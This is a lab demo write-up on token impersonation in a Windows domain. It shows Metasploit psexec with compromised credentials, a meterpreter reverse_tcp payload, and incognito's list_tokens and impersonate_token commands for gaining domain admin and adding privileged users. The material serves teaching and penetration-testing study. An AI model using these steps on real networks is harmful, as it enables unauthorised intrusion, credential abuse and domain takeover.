# Token Impersonation Attack LAB DEMO

Token Impersonation is a Post- compromise attack which can be used for lateral movement or domain escalation. This attack scenario will demonstrate how attackers can use these token of privileged users like ADMIN to escalate their domain privileges.

<br>Imagine we have two machines, one user machine (BATMAN) and one Domain Controller (JUSTICE-DC). and as an attacker we managed to compromise one of the user machines (BATMAN) and now we have local admin privileges. <br>
Now we can perform a Post-compromise enumeration using tools like `Bloodhound` and **identify active sessions of privileged users.**

<br>Now Imagine a Domain Admin `HERO/Administrator` logged into to `BATMAN`. Since we have a DOMAIN ADMIN session on our compromised computer, we can list the available tokens and use them to impersonate ADMINISTRATOR using a tool called `incognito` from Metasploit.

#### ATTACK METHODOLOGY:

1. First We need to connect to the machine using the `psexec` module using the compromised username and password.

```bash
msfconsole                           #Starts Metasploit
use exploit/windows/smb/psexec       #Loads psexec module
```

2. Then we need to set all the necessary options like RHOST, username password, domain, targets etc.. and run. This will generate a `meterpreter` session.

```
set RHOST "REMOTE HOST IP"
set SMBDomain "TARGET DOMAIN NAME"
set SMBUser "COMPROMISED USER NAME"
set SMBPass "COMPROMISED USER PASSWORD"
set payload /windows/x64/meterpreter/reverse_tcp
```

<br>
3. Now load the `incognito` module using `load incognito` command. This module has commands which lists all the available tokens which can be later used for impersonation.

```bash
load incognito

list_tokens -u
```

4. We have a delegation token for the ADMINISTRATOR. This means that the domain admin of `HERO.local` had logged into `BATMAN` at some point using their credentials. 

5. To take advantage of the this token, we will run the `impersonate_token `command with the domain admin name `HERO\Administrator` to impersonate their account.

```bash
impersonate_token HERO\\Administrator
```

Now we have an DOMAIN ADMIN shell session on `BATMAN` machine !!!  Now we can use this session to perform actions that require elevated privileges like making changes to the domain. Adding a new user, adding user to ADMIN group
